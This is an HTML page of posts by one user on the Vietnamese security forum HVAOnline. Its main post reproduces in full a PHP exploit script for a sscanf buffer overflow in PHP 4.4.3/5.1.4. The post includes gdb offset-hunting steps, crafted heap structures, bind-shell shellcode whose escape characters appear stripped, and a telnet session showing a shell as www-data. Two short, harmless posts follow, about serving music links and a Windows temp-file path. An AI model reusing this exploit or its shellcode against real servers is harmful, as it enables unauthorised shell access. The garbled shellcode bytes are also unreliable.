<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"> 

<html>
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="-1">
<meta name="description" content="HVA discussion board">
<meta name="keywords" content="Messages posted by LeonHart, jforum, jforum java, jforum forum, forum java, java jforum, java forum, forum, rafael steil, bulletin board, java bb, javabb, hva, hvaonline, hvazone, hvaforum">
<meta name="resource-type" content="document">
<meta name="distribution" content="global">
<meta name="robots" content="index,follow">
<meta name="rating" content="general">
<style type="text/css">
<!-- 
@import url( "http://www.hvaonline.net/hvaonline/templates/viet/styles/style.css");
-->
</style>
<style type="text/css">
<!--
@import url("http://www.hvaonline.net/hvaonline/templates/viet/styles/en_US.css");
-->
</style>
<title>Messages posted by LeonHart - .:: HVAOnline ::.</title>

</head>
<body class="en_US">


<!--
Original theme from phpBB (http://www.phpbb.com) subSilver
Created by subBlue design
http://www.subBlue.com
Modifications by JForum Team 
Extended and customised by HVA Team
Added more features and Black Silver theme designed by HVA
-->
<table width="100%" border="0" cols="2">
	<tr align="right">
		<td class="copyright">
			English
			| 
			<a href="/hvaonline/jforum.hva?module=forums&amp;action=setLang&amp;lang=vi_VN" rel="nofollow">Vietnamese</a>
		</td>
	</tr>
</table>
<table width="100%" border="0">
	<tr>
		<td>
			<table cellspacing="0" cellpadding="0" width="100%" border="0">
				<tr>			
        <td>&nbsp;
			</td>
		
        <td width="100%" align="center" valign="middle">
						<p><a href="http://www.hvaonline.net" title="[Logo]">
								<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/hvabanner-final.gif" alt="banner" />
							<br>
            				</a><span class="maintitle"></span>
						</p>
          <table cellspacing="0" cellpadding="2" border="0">
							<tr>
								
              <td valign="top" nowrap="nowrap" align="center">
			  						<a href="/hvaonline/forums/rule.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_rule.gif" alt="[Rule]" title="[Rule]"></a>
									<a id="rule" class="topmenu" href="/hvaonline/forums/rule.hva">Rules</a>&nbsp;
									
									<a class="topmenu" href="/hvaonline/forums/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_groups.gif" alt="[Home]" title="[Home]"></a>
										<a id="backtosite" class="topmenu" href="/hvaonline/forums/list.hva">Main Forum</a>&nbsp;

										<a class="topmenu" href="/hvaonline/portal/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_portal.gif" alt="[Portal]" title="[Portal]"></a>
										<a id="portalsite" class="topmenu" href="/hvaonline/portal/list.hva">Portal</a>&nbsp;&nbsp;
									<br>
									
										<a href="/hvaonline/user/list.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_members.gif" alt="[Members]" title="[Members]"></a>
										<a id="users" class="topmenu" href="/hvaonline/user/list.hva">Member Listing</a>&nbsp;
										
										<a href="/hvaonline/forums/stats.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_stats.gif" alt="[Statistics]" title="[Statistics]"></a>
										<a id="stats" class="topmenu" href="/hvaonline/forums/stats.hva">Statistics</a>&nbsp;
										
										<a href="/hvaonline/search/filters.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_search.gif" alt="[Search]" title="[Search]"></a>
										<span class="mainmenu"><a id="search" class="topmenu" href="/hvaonline/search/filters.hva"><b>Search</b></a>&nbsp;
									
										<a href="/book/"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_book.gif" alt="[Reading Room]" title="[Reading Room]"></a> 
										<a class="topmenu" href="/hvaonline/readingRoom/list.hva">Reading Room</a>&nbsp;

									
									<span class="topmenu"> 
										

	
										<br>
											<a id="register" class="topmenu" href="/hvaonline/user/insert.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_register.gif" border="0" alt="[Register]" title="[Register]"> 
												Register</a>&nbsp;&nbsp;</span>
											<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_mini_login.gif" border="0" alt="[Login]" title="[Login]"> 
											<strong>Login</strong> [&nbsp;
											<a id="login" class="topmenu" href="/hvaonline/user/login.hva">http</a>&nbsp;
											|
											<a id="logins" class="topmenu" href="https://www.hvaonline.net/hvaonline/user/logins.hva">https </a>&nbsp;]</span>
								</td>
							</tr>
							<tr>
								<td>&nbsp;</td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td>

<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post_show.js"></script>
<script type="text/javascript" src="http://www.hvaonline.net/hvaonline/templates/viet/js/post.js"></script>
<script type="text/javascript">
<!--

function showEmail(beforeAt, afterAt)
{
	return beforeAt + "@" + afterAt;
}

var starOn=new Image();
starOn.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_on.gif";

var starOff=new Image();
starOff.src="http://www.hvaonline.net/hvaonline/templates/viet/images/star_off.gif";

function writeStars(q, postId)
{
	for (var i = 0; i < 5; i++) {
		var name = "star" + postId + "_" + i;
		document.write("<img name='" + name + "' alt='*' />");
		document.images[name].src = q > i ? starOn.src : starOff.src;
	}
}

function addBookmark(relationType, relationId)
{
	var w = window.open('/hvaonline/bookmarks/insert/' + relationType + '/' + relationId + '.hva', 'bookmark_add', 'width="700", height="100", scrollbars="no"');
	w.focus();
}

function supportAjax()
{
	if (typeof(AjaxUtils) != 'undefined') {
		if (window.ActiveXObject) {
			var r = new ActiveXObject("Microsoft.XMLHTTP");
			return r != undefined;
		}
		else if (window.XMLHttpRequest) {
			return true;
		}
	}

	return false;
}

-->
</script>

<table cellspacing="0" cellpadding="10" width="98%" align="center" border="0">
	<tr>
		<td class="bodyline">
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					<td valign="middle" align="left" colspan="2">
						<span class="maintitle"><a href="/hvaonline/posts/listByUser/6383.hva" name="top" class="maintitle" id="top">Messages posted by: LeonHart</a></span>
						&nbsp;<a href="/hvaonline/rss/showPostsByUser/6383.hva"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/xml_button.gif" border="0" alt="XML" /></a>
					</td>
				</tr>
			</table>
			
			<table cellspacing="2" cellpadding="2" width="100%" border="0">
				<tr>
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						<a href="/hvaonline/user/profile/6383.hva">Profile for LeonHart</a> 
            			<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif"><a href="/hvaonline/posts/listByUser/6383.hva">Messages posted by LeonHart</a>
						</span>
					</td>
										
					<td valign="middle" align="right">
						<span class="nav">[ number of posts not being displayed on this page: <span class="moderator">27</span> ]</span>
					</td>
				</tr>
			</table>

			
      <table class="forumline" cellspacing="1" cellpadding="3" width="100%" border="0">
        <tr>
          <th height="26" nowrap="nowrap" class="thleft">&nbsp;</th>
        </tr>

				
        <!-- POST LISTING -->
         
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/13.hva">Thông tin new bugs và exploits</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3088.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3088/17325.hva#17325,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody"><span class="quotetxt"><b>Code:</b></span><br/>
<div class="coded"">
<pre>&lt;?
/***********************************************************
* hoagie_php_sscanf.php
* PHP &lt;= 4.4.3 / 5.1.4 local buffer overflow exploit
*
* howto get offsets:
* &#40;set $base_addr to 0x41414141&#41;
* # ulimit -c 20000
* # /etc/init.d/apache restart
* &#40;execute script via web browser&#41;
* # tail /var/log/apache/error.log
* ...
* &#91;Wed Aug 16 15:07:10 2006&#93; &#91;notice&#93; child pid 28222 exit signal
Segmentation fault &#40;11&#41;, possible coredump in /tmp
* ...
* $ gdb /usr/sbin/apache /tmp/core
* ...
* ...
* #0 0x40422b2d in php_sscanf_internal &#40;&#41; from
/usr/lib/apache/1.3/libphp4.so
* &#40;gdb&#41; x/250 $edx
* ...
* 0x83ae16c: 0x41414141 0x41414141 0x41414141
0x41414141
* 0x83ae17c: 0xdeadbabe 0x41414145 0x4141415d
0x00000001
* ^^^^^^^^^^
* start of our buffer &#40;0x83ae180&#41; =
$base_addr
* 0x83ae18c: 0x00000008 0x4141415d 0x0833d248
0x00000400
* 0x83ae19c: 0x909006eb 0x90909090 0xe3f7db31
0x435366b0
* ^^^^^^^^^^
* start of shell code
&#40;0x83ae1a4&#41;
* 0x83ae1ac: 0x89534353 0x80cd4be1 0x6652c789
0x43204e68
* 0x83ae1bc: 0xe1895366 0xd0f6efb0 0x89575150
0xcd66b0e1
* 0x83ae1cc: 0x4366b080 0x5080cd43 0xe1895750
0xcd66b043
* 0x83ae1dc: 0x89d98980 0x2c6fb0c3 0x80cd4930
0x51f6e241
* 0x83ae1ec: 0x732f6e68 0x2f2f6868 0xe3896962
0xe1895351
* 0x83ae1fc: 0xd0f6f4b0 0x414180cd 0x41414141
0x41414141
* 0x83ae20c: 0x41414141 0x41414141 0x41414141
0x41414141
* ...
* &#40;gdb&#41; quit
* #
* &#40;change $base_addr in exploit and now call url again&#41;
* # gdb /usr/sbin/apache /tmp/core
* #0 0x40475e73 in _efree &#40;&#41;
* from /usr/lib/apache/1.3/libphp4.so
* &#40;gdb&#41; x/4w $ebp
* 0xbfffb018: 0xbfffb038 0x40484241 0x0812a2f4
0xbfffb038
* ^^^^^^^^^^
* return address &#40;return address location
= 0xbfffb01c&#41;
* &#40;change $rec_log in exploit and call url again&#41;
* $ telnet 127.0.0.1 20000
* Trying 127.0.0.1...
* Connected to localhost.
* Escape character is '^&#93;'.
* id;
* uid=33&#40;www-data&#41; gid=33&#40;www-data&#41; groups=33&#40;www-data&#41;
* exit;
* Connection closed by foreign host.
* $
*
* NOTE: Because of PHP memory allocation this exploit depends on
filename, pathname
* content etc... &#40;because each line/byte will change emalloc&#40;&#41;
behavior
*
* Credits: Heintz &#40;discovered this bug&#41;
* BigHawk &#40;bind shell code&#41;
* Greuff &#40;void.at&#41;
*
* THIS FILE IS FOR STUDYING PURPOSES ONLY AND A PROOF-OF-
* CONCEPT. THE AUTHOR CAN NOT BE HELD RESPONSIBLE FOR ANY
* DAMAGE DONE USING THIS PROGRAM.
*
* VOID.AT Security
* &lt;a href="mailto:andi@void.at"&gt;andi@void.at&lt;/a&gt;
*<span class="link"> http://www.void.at</span>
*
************************************************************/
/* base_addr for buffer in memory */
$base_addr = 0x812a260;
$base_addr_fill = 0x16;
/* byte 0 = fill up, byte 1 = refcount, byte 2 = is_ref, byte 3 = type
*/
$zval_attr = 0x00000008;
/* will be overwritten to execute our shellcode */
$ret_loc = 0xbfffb01c;
/* just for searching */
$pattern = 0xdeadbabe;
function long2str&#40;$addr&#41; {
return pack&#40;"V", $addr&#41;;
}
$data =
/* fill up memory */
str_repeat&#40;long2str&#40;$base_addr&#41;, $base_addr_fill&#41; .
/* pattern */
long2str&#40;$pattern&#41; .
/* current = base_addr */
long2str&#40;$base_addr + 0x4&#41; .
/* *current = _zval_struct */
/* _zval_struct */
/* _zvalue_value */
/* _zvalue_value.str.val */
long2str&#40;$base_addr + 0x10 + 0xc&#41; .
/* _zvalue_value_str.len */
long2str&#40;0x00000001&#41; .
/* _zval_struct.type, _zval_struct.is_ref, _zval_struct.refcount */
long2str&#40;$zval_attr&#41; .
/* _zend_mem_header */
/* _zend_mem_header.pNext = start of shellcode */
long2str&#40;$base_addr + 28&#41; .
/* _zend_mem_header.pLast */
long2str&#40;$ret_loc&#41; .
/* zend_mem_header.size, zend_mem_header.cached */
long2str&#40;0x000000400&#41; .
/* jump over next six bytes */
"xebx06x90x90" .
/* this bytes will be overwritten by efree&#40;&#41; */
"x90x90x90x90" .
/* shell code starts here -
* BigHawk bind&#40;&#41; version - just a little update to get rid
* of 0x3f
*/
"x31xdbxf7xe3xb0x66x53x43x53x43x53x89xe1x4bxcd"
.
"x80x89xc7x52x66x68x4ex20x43x66x53x89xe1xb0xef"
.
"xf6xd0x50x51x57x89xe1xb0x66xcdx80xb0x66x43x43"
.
"xcdx80x50x50x57x89xe1x43xb0x66xcdx80x89xd9x89"
.
"xc3xb0x6fx2cx30x49xcdx80x41xe2xf6x51x68x6ex2f"
.
"x73x68x68x2fx2fx62x69x89xe3x51x53x89xe1xb0xf4"
.
"xf6xd0xcdx80" .
/* fill up memory */
str_repeat&#40;long2str&#40;$base_addr&#41;, $base_addr_fill&#41;;
/* fill up memory with emalloc&#40;&#41; for sscanf&#40;&#41; */
quotemeta&#40;$data&#41;;
/* trigger exploit */
sscanf&#40;$data, '%1$s', $str&#41;;
?&gt;</pre>
</div></span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/8.hva">Thảo luận bảo mật</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/1187.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/1187/17026.hva#17026,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row2" valign="top">
			<span class="postbody">Tốt nhất là create 1 table xong rồi bỏ id với link vô. Mỗi lần muốn nghe query cái id ra. Lưu ý: đừng làm readfile($link); để output song ra thôi. Khi đó nghe được mà lấy link không được. Demo: http://landautien.com/forum/music.php</span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
	
					
        <tr>		
          <td class="postInfo">
			<table width="100%">				
              <tr>								
                <td align="left" >
				<span class="topmenu"><a href="/hvaonline/forums/show/23.hva">Thảo luận hệ điều hành Windows</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/list/3041.hva">Empty</a></span>
				<span class="topmenu"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/en_US/arrow.gif">&nbsp;<a href="/hvaonline/posts/preList/3041/17022.hva#17022,">Go to message</a></span>
              </tr>
			</table>
			</td>
        </tr>

        <tr>
        <!-- Message -->
          	<td class="row1" valign="top">
			<span class="postbody">Here<br/> C:\Documents and Settings\%username%\Local Settings\Temporary Internet Files\<br/> </span>
				
        <!-- Attachments -->
			</td>
        </tr>
		
					
        <tr>		
          <td class="spacerow" height="1"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
        </tr>
				
        <!-- END OF POST LISTING -->
			
				

			
      </table>
		
			<table cellspacing="2" cellpadding="2" width="100%" align="center" border="0">
				<tr>					
					
					<td valign="middle" align="left" colspan="0">
						<span class="nav">
						&nbsp;
						</span>
					</td>

					<td valign="middle" align="right">					
		<table cellspacing="0" cellpadding="0" border="0">
		<tr>			  
			<td nowrap="nowrap" align="right">
				<form action="" name="p" id="p" accept-charset="UTF-8"> 
					
					<span class="gensmall">Go to Page:&nbsp;</span>
					
						<a href="/hvaonline/posts/listByUser/6383.hva">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_first_page.gif" width="8" height="9" alt="First Page" title="First Page"/>
						</a>
							
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/0/6383.hva">1</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/30/6383.hva">2</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/60/6383.hva">3</a></span>
							
					
						<select onchange="if(this.options[this.selectedIndex].value > 0){ document.location = '/hvaonline/posts/listByUser/'+ ( (this.options[this.selectedIndex].value - 1) * 30)  + '/6383' + '.hva'; }" name="select2">
							<option value="-1" selected="selected">---</option>		
							
								<option value="1" >1</option>	
								<option value="2" >2</option>	
								<option value="3" >3</option>	
								<option value="4" selected="selected">4</option>	
								<option value="5" >5</option>	
								<option value="6" >6</option>	
								<option value="7" >7</option>	
						</select>
						
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/120/6383.hva">5</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/150/6383.hva">6</a></span>
								<span class="gensmall"><a href="/hvaonline/posts/listByUser/180/6383.hva">7</a></span>
						
						<a href="/hvaonline/posts/listByUser/180/6383.hva">
							<img src="http://www.hvaonline.net/hvaonline/templates/viet/images/icon_last_page.gif" width="8" height="9" alt="Last Page" title="Last Page (7)"/>
						</a>
				</form>
			</td>
		</tr>
		</table>
</td>
				</tr>
				
				<tr>
					<td colspan="3"><img src="http://www.hvaonline.net/hvaonline/templates/viet/images/spacer.gif" alt="" width="1" height="1" /></td>
				</tr>			
			</table>
		</td>
	</tr>
</table>


	<tr>	
		<td align="center">
		<br>
					</td>
	</tr>

	<tr>
		<td align="center">
			<span class="copyright">Powered by JForum - Extended by <a href="MailTo:lienlac@hvaonline.net">HVAOnline</a><br>
			&nbsp;hvaonline.net&nbsp; | &nbsp;hvaforum.net&nbsp; | &nbsp;hvazone.net&nbsp; | &nbsp;hvanews.net&nbsp; | &nbsp;vnhacker.org<br>
			1999 - 2013 &copy;
			v2012|0504|218|
		  </span>
	  </td>
	</tr>
<iframe src="/hvaonline/templates/ping_session.jsp" height="0" width="0" frameborder="0" scrolling="no"></iframe>
</body>
</html>
